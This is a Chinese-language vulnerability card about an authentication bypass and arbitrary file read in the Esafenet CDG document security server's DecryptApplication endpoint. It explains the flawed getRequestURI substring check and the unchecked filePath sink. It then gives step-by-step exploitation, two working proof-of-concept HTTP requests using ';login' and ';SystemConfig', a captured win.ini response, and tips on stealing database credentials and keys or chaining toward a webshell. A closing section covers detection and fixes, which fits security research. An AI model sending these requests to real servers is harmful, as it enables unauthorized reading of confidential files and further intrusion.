---
id: web-generic-file-inclusion-cdg-decryptapplication-filepath-read
title: 亿赛通 CDG DecryptApplication 任意文件读取：filePath 直入 new File/FileInputStream + getRequestURI 子串校验被 ;login/;SystemConfig 绕过
type: scenario
domain: web
path: web/generic/file-inclusion
technique: cdg-decryptapplication-filepath-arbitrary-read
aliases:
- 亿赛通 DecryptApplication 任意文件读取
- CDGServer3 DecryptApplication
- 亿赛通 CDG 任意文件下载
- com.esafenet.servlet.client.DecryptApplicationService
- WebController action 反射调用
- ;login 矩阵参数绕过
tags:
- java
- servlet
- esafenet
- cdg
- arbitrary-file-read
- file-download
- auth-bypass
- semicolon
- path-traversal
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:12:07+08:00'
  notes: 已对照原文核对；;login 与 ;SystemConfig 两种绕过路径均与 win.ini 200 截图一致；未复跑。
---

## 一句话结论

亿赛通电子文档安全管理系统（CDG）的 `GET/POST /CDGServer3/client/DecryptApplication` 由 `DecryptApplicationService` 交给 `WebController.service` 反射调用 `action`+`command`；`command=ViewUploadFile` 时 `actionViewUploadFile` 从请求取 `filePath` 并原样传给 `downLoadFile`，后者只校验 `uploadFileId` 非空，随后 `new File(filePath)` 存在即用 `CDGUtil.downFile` 的 `FileInputStream` 下载。由于 `filePath` 完全可控且无过滤，可读取服务器任意文件；认证判断使用 `getRequestURI().indexOf("login"/"SystemConfig")` 子串匹配，在路径中插入 `;login` 或 `;SystemConfig` 矩阵参数即可未授权访问。

## 原理

- **入口与反射调用**：`web.xml` 将 `/client/DecryptApplication` 映射到 `com.esafenet.servlet.client.DecryptApplicationService`，该类继承 `WebController`（继承 `HttpServlet`）。`WebController.service` 取 `command` 参数，把方法名拼成 `"action" + commandName`，通过 `getDeclaredMethod`/`invoke` 反射调用；`command=ViewUploadFile` 对应 `actionViewUploadFile`。`command` 为空或 `"null"` 时不进入反射分支。
- **认证判断缺陷**：`WebController.service` 用 `request.getRequestURI()` 得到 `clienturl`，判断条件是：
  ```java
  if (clienturl != null && (clienturl.indexOf("login") != -1
        || clienturl.indexOf("SystemConfig") != -1)
      || loginMng != null && loginMng.isLogin()) { ...反射调用... }
  else { response.sendRedirect(contextPath + "/loginExpire.jsp"); }
  ```
  由于 `&&` 优先级高于 `||`，实际是“URI 含 login/SystemConfig” **或** “会话已登录”。它把“URL 中出现 login”当成已登录/登录页放行，而不是校验会话。
- **矩阵参数绕过**：`getRequestURI()` 返回原始 request-target，保留 `;` 后的矩阵参数；Servlet 容器在映射前会剥离 `;` 到下一个 `/` 的内容。请求 `/CDGServer3/client/;login/DecryptApplication` 对容器而言仍映射到 `/client/DecryptApplication`，但 `getRequestURI()` 里包含 `login`，于是认证分支被满足；`;SystemConfig` 同理。这是“过滤器看原始 URI、路由看规范化路径”的经典语义差。
- **文件读取 sink**：`actionViewUploadFile` 从 `request` 取 `uploadFileId`、`fileName1`（下载显示名）、`filePath`（服务器实际路径），传给 `DecryptApplicationModel.downLoadFile`。`downLoadFile` 只判断 `uploadFileId != null && !uploadFileId.trim().equals("")`，然后 `new File(filePath)`；`file.exists()` 为真时调用 `CDGUtil.downFile(filePath, res, fName)`。
- **下载实现**：`CDGUtil.downFile` 用 `FileInputStream(fileWholePath)` → `BufferedInputStream` → `response.getOutputStream()`，设置 `Content-Type: application/MIME-CobraDG;charset="GB2312"` 与 `Content-Disposition: attachment;filename=...`，按 4096 字节循环写出。没有任何 `getCanonicalPath()`、根目录前缀或后缀白名单校验，因此 `filePath` 可以是任意绝对路径（Windows 用 `C://Windows/win.ini` 或 `C:\Windows\win.ini` 形式）。
- **利用条件组合**：攻击者只需 `uploadFileId` 传任意非空值（如 `1`）绕过空值检查，`filePath` 指向目标文件，`fileName1` 控制下载文件名；`command=ViewUploadFile` 触发反射。GET/POST 均可，因为 `RsDispatcherServlet.doGet` 直接调用 `doPost`。

## 触发条件

- 目标为部署了 `DecryptApplication` Servlet 的亿赛通 CDG（`/CDGServer3/client/DecryptApplication`）。
- 攻击者可访问该 HTTP 路径；无需有效会话（通过 `;login`/`;SystemConfig` 绕过）。
- 目标文件存在且对应用进程可读（如 `C:/Windows/win.ini`、配置文件、日志、密钥文件）。
- 容器允许矩阵参数（Tomcat 等常见 Servlet 容器默认剥离 `;` 参数），且路由不会被前置网关拒绝。

## 利用步骤

1. **基线**：直接请求 `https://target/CDGServer3/client/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1`，未登录时应 302 到 `/loginExpire.jsp`，说明认证分支未满足。
2. **构造绕过路径**：在 `/client/` 后插入 `;login` 或 `;SystemConfig`：
   `https://target/CDGServer3/client/;login/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1`
3. **触发反射**：保持 `command=ViewUploadFile`，`uploadFileId` 非空，`fileName1` 为下载文件名。
4. **指定目标文件**：把 `filePath` 换成任意绝对路径，如 `C:/Windows/win.ini`、应用配置文件、日志、备份文件；Windows 路径可用正斜杠或反斜杠。
5. **验证**：响应 200，`Content-Disposition: attachment;filename=1`，正文为文件内容；若文件不存在会 forward 到 `UploadFileManager.jsp` 并提示“该文件未上传”。
6. **扩大影响**：读取数据库连接串、密钥、文档加密策略配置等，为后续横向/解密文档做准备；GET/POST 都可发送。

## PoC

```http
GET /CDGServer3/client/;login/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1 HTTP/1.1
Host: target
```

```http
GET /CDGServer3/client/;SystemConfig/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1 HTTP/1.1
Host: target
```

实测响应：

```text
HTTP/1.1 200 OK
Content-Disposition: attachment;filename=1
Content-Type: application/MIME-CobraDG;charset="GB2312";Content-Disposition:attachment;filename=1
Content-Length: 282
...
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
...
```

未绕过时同一请求返回 302，`Location: .../loginExpire.jsp`。

## 变体与关联

- **认证绕过变体**：`;login`、`;SystemConfig` 均可；也可尝试其他包含 `login` 的矩阵参数/路径段。若前置网关规范化 URI，需要绕过网关与容器的解析差异。
- **反射 action 变体**：`command` 可换成其他 `actionXxx` 方法名，若存在其他文件操作/管理方法，可能扩大攻击面；`command` 为 `null` 字符串时不会进入反射分支。
- **下载名/路径变体**：`fileName1` 只影响响应头文件名；`filePath` 支持绝对路径，无需 `../`，因此传统目录穿越过滤拦不住。
- **同产品其他漏洞**：亿赛通 CDG 还有 `uploadSoftWareFile` 的 `patch`/`filePath` 路径穿越写 WebShell，可与本卡的文件读取组合做信息收集与 RCE。
- 关联：[[web-generic-auth-oa-jsf-sessionfilter-loginjsf-semicolon-bypass]]（getRequestURI 子串匹配 + 矩阵参数绕过）、[[web-generic-auth-newbeemall-semicolon-admin-bypass]]（分号路径参数鉴权绕过）、[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]（new File/FileInputStream 任意文件读取）、[[web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell]]（同产品路径穿越写 WebShell）。

## 检测与防御

- **访问日志**：监控 `/CDGServer3/client/` 下包含 `;login`、`;SystemConfig` 的请求，尤其是同一 IP 随后访问 `DecryptApplication` 且 `filePath` 为绝对路径；也监控 `command=ViewUploadFile` 的异常下载。
- **参数检测**：对 `filePath` 出现盘符（`C:/`、`C:\`）、UNC、`/etc/`、`win.ini`、`config`、`.key` 等敏感路径的请求告警；正常业务下载应使用文件 ID 而非绝对路径。
- **修复**：升级到厂商安全版本；`downLoadFile` 改为按 `uploadFileId` 查数据库映射的真实路径，使用 `getCanonicalPath()` 并校验前缀在允许目录内；`WebController` 认证改为严格会话校验，禁止用 `getRequestURI()` 子串判断登录状态，并在网关层拒绝含 `;` 的异常路径。
- **收敛暴露面**：关闭外网访问，dashboard/业务端口仅内网可达；在反向代理层做 URI 规范化与路径白名单。
